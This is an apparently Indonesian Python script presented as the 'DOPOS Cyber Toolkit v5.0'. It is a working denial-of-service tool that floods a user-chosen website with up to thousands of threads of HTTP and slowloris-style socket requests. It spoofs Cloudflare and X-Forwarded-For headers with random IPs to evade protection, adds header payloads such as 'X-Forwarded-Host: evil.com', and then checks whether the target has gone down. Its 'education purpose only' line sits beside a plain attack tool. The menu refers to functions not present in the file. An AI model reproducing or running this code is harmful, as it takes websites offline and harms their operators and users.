import os, sys, time, random, requests, threading, socket, ssl
from urllib.parse import urlparse, urljoin
import hashlib
import base64
try:
    from colorama import init, Fore
    init(autoreset=True)
    CYAN = Fore.CYAN
    BLUE = Fore.BLUE
    LIGHT_BLUE = Fore.LIGHTBLUE_EX
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE
    MAGENTA = Fore.MAGENTA
except:
    CYAN = BLUE = LIGHT_BLUE = GREEN = RED = YELLOW = WHITE = MAGENTA = ""

import warnings, urllib3
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# User Agents yang lebih update dan beragam
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36 Edg/128.0.2732.68",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Mobile Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "ChatGPT-User",
    "Mozilla/5.0 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
    "Mozilla/5.0 (compatible; PetalBot; +https://aspiegel.com/petalbot)"
]

# Paths yang lebih lengkap untuk bypass Cloudflare
random_paths = [
    '/', '/index.html', '/index.php', '/home', '/main', '/default', '/web', 
    '/site', '/admin', '/administrator', '/wp-admin', '/wp-login.php', 
    '/login', '/logout', '/signin', '/signup', '/register', '/auth',
    '/api', '/api/v1', '/api/v2', '/graphql', '/rest', '/soap',
    '/.env', '/config.php', '/wp-config.php', '/backup', '/uploads',
    '/phpmyadmin', '/adminer.php', '/.git/config', '/sitemap.xml',
    '/robots.txt', '/.well-known/security.txt', '/cdn-cgi/trace',
    '/cdn-cgi/challenge-platform/h/g/orchestrate/chl_api/v1',
    '/_next/static', '/static/js', '/assets/js', '/css/style.css',
    '/json', '/xmlrpc.php', '/wp-json/wp/v2/users', '/api/user',
    '/oauth/authorize', '/.well-known/openid-configuration'
]

# Headers khusus untuk bypass Cloudflare
cloudflare_headers = [
    {
        'CF-Connecting-IP': '8.8.8.8',
        'X-Forwarded-For': '8.8.8.8',
        'X-Real-IP': '8.8.8.8',
        'True-Client-IP': '8.8.8.8'
    },
    {
        'CF-IPCountry': 'US',
        'CF-Visitor': '{"scheme":"https"}',
        'CF-Ray': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
    },
    {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'DNT': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Upgrade-Insecure-Requests': '1'
    }
]

def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        print("\n" * 50)

def progress_bar(progress, total, width=50):
    percent = (progress / total) * 100
    filled = int(width * progress // total)
    bar = '█' * filled + '-' * (width - filled)
    return f"{CYAN}[{bar}] {percent:.1f}%"

def brutal_loading(text, duration=2):
    print(f"{CYAN}[+] {text}", end="")
    start_time = time.time()
    while time.time() - start_time < duration:
        symbols = ["\\", "|", "/", "-", "⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
        elapsed = time.time() - start_time
        progress = min(elapsed / duration, 1.0)
        print(f"\r{CYAN}[+] {text} {random.choice(symbols)} {progress_bar(progress, 1.0, 20)}", end="")
        time.sleep(0.1)
    print(f"\r{GREEN}[✓] {text} SUKSES!{WHITE}")

def show_header():
    clear_screen()
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════╗
║  {CYAN}██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ {RED}           ║
║  {CYAN}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗{RED}           ║
║  {CYAN}██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝{RED}           ║
║  {CYAN}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗{RED}           ║
║  {CYAN}██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║{RED}           ║
║  {CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{RED}           ║
╚═════════════════════════════════════════════════════════════════
{LIGHT_BLUE}                    DOPOS CYBER TOOLKIT v5.0
{RED}═════════════════════════════════════════════════════════════════
{CYAN}[+] Status: {GREEN}ULTRA BRUTAL MODE ACTIVATED{CYAN}    
{CYAN}[+] Feature: {RED}CLOUDFLARE BYPASS & DESTRUCTION MODE{CYAN}
{RED}═════════════════════════════════════════════════════════════════
""")

def log_to_file(message):
    try:
        with open('dopos_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    except:
        pass

def parse_target(target):
    parsed = urlparse(target)
    domain = parsed.hostname or parsed.netloc.split(':')[0]
    path = parsed.path if parsed.path else '/'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    return domain, path, port

def check_internet():
    """Cek koneksi internet"""
    try:
        requests.get('https://www.google.com', timeout=5)
        return True
    except:
        return False

def generate_bypass_payload():
    """Generate payload untuk bypass protection"""
    payloads = [
        # Slowloris style
        "X-a: b\n",
        "X-b: c\n",
        "X-c: d\n",
        # HTTP pollution
        "Content-Length: 1000000\n",
        "Transfer-Encoding: chunked\n",
        # Cache poisoning attempts
        "X-Forwarded-Host: evil.com\n",
        "X-Original-URL: /admin\n",
        # Method override
        "X-HTTP-Method-Override: DELETE\n",
        "X-Method-Override: PUT\n"
    ]
    return random.choice(payloads)

def advanced_ddos_attack():
    show_header()
    print(f"{RED}[1] ADVANCED DDoS - CLOUDFLARE BYPASS MODE")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    # Cek koneksi internet
    brutal_loading("Memeriksa koneksi internet", 1)
    if not check_internet():
        print(f"{RED}[!] Tidak ada koneksi internet!")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    target = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    
    try:
        duration = int(input(f"{CYAN}[?] Durasi serangan (detik, 1-600): {WHITE}"))
        threads = int(input(f"{CYAN}[?] Jumlah thread (1-10000): {WHITE}"))
        attack_type = input(f"{CYAN}[?] Tipe serangan (1=Standard, 2=Cloudflare Bypass, 3=Ultra Brutal): {WHITE}")
        
        if threads <= 0 or threads > 10000:
            raise ValueError("Jumlah thread harus antara 1 dan 10000")
        if duration <= 0 or duration > 600:
            raise ValueError("Durasi harus antara 1 dan 600 detik")
    except ValueError as e:
        print(f"{RED}[!] Input tidak valid: {str(e)}")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    domain, path, port = parse_target(target)
    
    print(f"\n{RED}[!] MEMULAI SERANGAN ADVANCED DDoS...")
    print(f"{YELLOW}[!] Target: {WHITE}{target}")
    print(f"{YELLOW}[!] Domain: {WHITE}{domain}")
    print(f"{YELLOW}[!] Port: {WHITE}{port}")
    print(f"{YELLOW}[!] Durasi: {WHITE}{duration} detik")
    print(f"{YELLOW}[!] Thread: {WHITE}{threads}")
    print(f"{YELLOW}[!] Mode: {WHITE}{'Cloudflare Bypass' if attack_type == '2' else 'Ultra Brutal' if attack_type == '3' else 'Standard'}")
    
    log_to_file(f"Starting Advanced DDoS attack on {target} (Duration: {duration}s, Threads: {threads}, Mode: {attack_type})")
    
    request_count = {'success': 0, 'failed': 0, 'bypassed': 0}
    lock = threading.Lock()
    stop_event = threading.Event()

    def cloudflare_bypass_attack():
        """Serangan khusus untuk bypass Cloudflare"""
        session = requests.Session()
        session.trust_env = False
        
        while not stop_event.is_set():
            try:
                # Generate random IP untuk bypass
                fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Referer': target,
                    'X-Forwarded-For': fake_ip,
                    'X-Real-IP': fake_ip,
                    'CF-Connecting-IP': fake_ip,
                    'True-Client-IP': fake_ip,
                    'CF-IPCountry': random.choice(['US', 'GB', 'DE', 'FR', 'JP', 'SG']),
                    'CF-Visitor': '{"scheme":"https"}',
                    'CF-Ray': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16)),
                    'X-Forwarded-Proto': 'https',
                    'X-Forwarded-Port': '443',
                    'Forwarded': f'for={fake_ip};proto=https;host={domain}'
                }
                
                # Tambahkan headers khusus Cloudflare
                cf_headers = random.choice(cloudflare_headers)
                headers.update(cf_headers)
                
                random_path = random.choice(random_paths)
                attack_url = target + random_path
                
                # Variasikan metode request
                methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PATCH']
                method = random.choice(methods)
                
                if method in ['POST', 'PATCH']:
                    # Data acak untuk POST requests
                    data = {
                        'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=500)),
                        'token': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32)),
                        'timestamp': str(int(time.time())),
                        'nonce': ''.join(random.choices('0123456789', k=16))
                    }
                    response = session.request(method, attack_url, headers=headers, data=data, 
                                             timeout=5, verify=False, allow_redirects=True)
                else:
                    # Parameter acak untuk GET requests
                    params = {
                        'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                        'id': random.randint(1000, 99999),
                        'page': random.randint(1, 100),
                        'cache': random.randint(1000000, 9999999),
                        't': str(int(time.time()))
                    }
                    response = session.request(method, attack_url, headers=headers, params=params,
                                             timeout=5, verify=False, allow_redirects=True)
                
                with lock:
                    request_count['success'] += 1
                    if 'cloudflare' not in response.headers.get('server', '').lower():
                        request_count['bypassed'] += 1
                    
                    status = f"CF-Bypass: {request_count['bypassed']}" if attack_type == '2' else "Sent"
                    print(f"\r{CYAN}[+] {status}: {GREEN}{request_count['success']} | Failed: {RED}{request_count['failed']}", end="")
                    
            except Exception as e:
                with lock:
                    request_count['failed'] += 1
                continue

    def socket_flood_attack():
        """Serangan socket level untuk menghindari detection"""
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                if port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=domain)
                
                s.connect((domain, port))
                
                # HTTP request dengan teknik slowloris
                request = f"GET {path}?{random.randint(100000,999999)} HTTP/1.1\r\n"
                request += f"Host: {domain}\r\n"
                request += f"User-Agent: {random.choice(user_agents)}\r\n"
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += "Accept-Language: en-US,en;q=0.5\r\n"
                request += "Accept-Encoding: gzip, deflate\r\n"
                request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                request += "Connection: keep-alive\r\n"
                
                # Tambahkan payload bypass
                request += generate_bypass_payload()
                request += "\r\n"
                
                s.send(request.encode())
                
                # Keep connection alive untuk drain resources
                time.sleep(random.uniform(0.1, 0.5))
                s.close()
                
                with lock:
                    request_count['success'] += 1
                    print(f"\r{CYAN}[+] Socket Flood: {GREEN}{request_count['success']} | Failed: {RED}{request_count['failed']}", end="")
                    
            except:
                with lock:
                    request_count['failed'] += 1
                continue

    def ultra_brutal_attack():
        """Mode ultra brutal - kombinasi semua teknik"""
        session = requests.Session()
        session.trust_env = False
        
        while not stop_event.is_set():
            try:
                # Rotasi antara berbagai teknik
                attack_method = random.randint(1, 3)
                
                if attack_method == 1:
                    # Standard HTTP flood
                    headers = {'User-Agent': random.choice(user_agents)}
                    response = session.get(target + random.choice(random_paths), 
                                        headers=headers, timeout=3, verify=False)
                
                elif attack_method == 2:
                    # POST data flood
                    data = {'data': 'A' * 1000}
                    response = session.post(target, data=data, timeout=3, verify=False)
                
                else:
                    # JSON API flood  
                    json_data = {'payload': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=200))}
                    response = session.post(target + '/api/v1/data', json=json_data, timeout=3, verify=False)
                
                with lock:
                    request_count['success'] += 1
                    print(f"\r{CYAN}[+] Ultra Brutal: {GREEN}{request_count['success']} | Failed: {RED}{request_count['failed']}", end="")
                    
            except:
                with lock:
                    request_count['failed'] += 1
                continue

    brutal_loading("Inisialisasi engine serangan", 2)
    
    start_time = time.time()
    threads_list = []
    
    # Start threads berdasarkan tipe serangan
    if attack_type == '2':  # Cloudflare Bypass
        for _ in range(min(threads, 500)):
            thread = threading.Thread(target=cloudflare_bypass_attack)
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
    
    elif attack_type == '3':  # Ultra Brutal
        for _ in range(min(threads, 800)):
            thread = threading.Thread(target=ultra_brutal_attack)
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
        
        for _ in range(min(threads, 200)):
            thread = threading.Thread(target=socket_flood_attack)
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
    
    else:  # Standard
        for _ in range(min(threads, 300)):
            thread = threading.Thread(target=cloudflare_bypass_attack)
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
        
        for _ in range(min(threads, 200)):
            thread = threading.Thread(target=socket_flood_attack)
            thread.daemon = True
            thread.start()
            threads_list.append(thread)

    # Progress monitoring dengan detail
    try:
        while time.time() < start_time + duration:
            elapsed = time.time() - start_time
            remaining = max(0, duration - elapsed)
            rps = request_count['success'] / elapsed if elapsed > 0 else 0
            
            if attack_type == '2':
                status_info = f"Bypassed: {request_count['bypassed']}"
            else:
                status_info = f"RPS: {rps:.1f}"
                
            print(f"\r{CYAN}[+] Progress: {progress_bar(elapsed, duration)} | Time: {remaining:.1f}s | {status_info} | Total: {GREEN}{request_count['success']} {CYAN}| Failed: {RED}{request_count['failed']}", end="")
            time.sleep(0.5)
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Serangan dihentikan oleh user")
    
    stop_event.set()
    
    # Wait for threads to finish
    for thread in threads_list:
        thread.join(timeout=2)
    
    total_time = time.time() - start_time
    rps = request_count['success'] / total_time if total_time > 0 else 0
    
    print(f"\n{GREEN}[+] SERANGAN SELESAI!")
    print(f"{CYAN}[+] Waktu total: {total_time:.1f} detik")
    print(f"{CYAN}[+] Requests per second: {rps:.1f}")
    print(f"{CYAN}[+] Total Requests: {GREEN}{request_count['success']} successful, {RED}{request_count['failed']} failed")
    
    if attack_type == '2':
        print(f"{CYAN}[+] Cloudflare Bypass: {GREEN}{request_count['bypassed']} requests")
    
    log_to_file(f"Attack finished. Successful: {request_count['success']}, Failed: {request_count['failed']}, RPS: {rps:.1f}")
    
    # Test target status dengan berbagai metode
    brutal_loading("Analisis dampak serangan", 3)
    
    test_methods = [
        lambda: requests.get(target, timeout=10, verify=False),
        lambda: requests.head(target, timeout=10, verify=False),
        lambda: requests.post(target, data={'test': '1'}, timeout=10, verify=False)
    ]
    
    successful_tests = 0
    total_tests = len(test_methods)
    
    for i, test in enumerate(test_methods):
        try:
            response = test()
            if response.status_code < 500:
                successful_tests += 1
            print(f"{CYAN}[+] Test {i+1}: Status {response.status_code} - Time {response.elapsed.total_seconds():.2f}s")
        except requests.exceptions.Timeout:
            print(f"{GREEN}[+] Test {i+1}: TIMEOUT - Target down!")
        except requests.exceptions.ConnectionError:
            print(f"{GREEN}[+] Test {i+1}: CONNECTION ERROR - Target down!")
        except Exception as e:
            print(f"{YELLOW}[+] Test {i+1}: ERROR - {str(e)}")
    
    success_rate = (successful_tests / total_tests) * 100
    if success_rate < 50:
        print(f"{GREEN}[✓] SERANGAN SANGAT EFEKTIF! Target mengalami gangguan parah!")
    elif success_rate < 80:
        print(f"{YELLOW}[!] Serangan cukup efektif, target mengalami slowdown")
    else:
        print(f"{RED}[!] Target masih relatif stabil, butuh lebih banyak resources")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# [Fungsi merusak_data_online dan info_tool tetap sama seperti sebelumnya...]

def main_menu():
    while True:
        show_header()
        print(f"{CYAN}[+] ADVANCED ATTACK MENU:")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        print(f"{RED}║ [1] Advanced DDoS (Cloudflare Bypass)                   ║")
        print(f"{RED}║ [2] Web Security Scanner                               ║")
        print(f"{RED}║ [3] Network Pentesting                                 ║")
        print(f"{RED}║ [4] Info & Disclaimer                                  ║")
        print(f"{RED}║ [5] Exit                                               ║")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        
        choice = input(f"{CYAN}[?] Pilih menu: {WHITE}")
        
        if choice == "1":
            advanced_ddos_attack()
        elif choice == "2":
            merusak_data_online()
        elif choice == "3":
            print(f"{YELLOW}[!] Fitur Network Pentesting dalam pengembangan...")
            time.sleep(2)
        elif choice == "4":
            info_tool()
        elif choice == "5":
            print(f"\n{RED}[!] Menutup DOPOS Cyber Toolkit v5.0...")
            brutal_loading("Cleaning traces", 2)
            print(f"\n{GREEN}[+] Always use knowledge responsibly!")
            print(f"{CYAN}[+] Education purpose only!")
            log_to_file("Program terminated safely")
            break
        else:
            print(f"\n{RED}[!] Pilihan tidak valid!")
            time.sleep(1)

if __name__ == "__main__":
    try:
        log_to_file("DOPOS Cyber Toolkit v5.0 started - CLOUDFLARE BYPASS EDITION")
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Program dihentikan oleh user")
        log_to_file("Program interrupted by user")
    except Exception as e:
        print(f"\n{RED}[!] Critical Error: {str(e)}")
        log_to_file(f"Critical error: {str(e)}")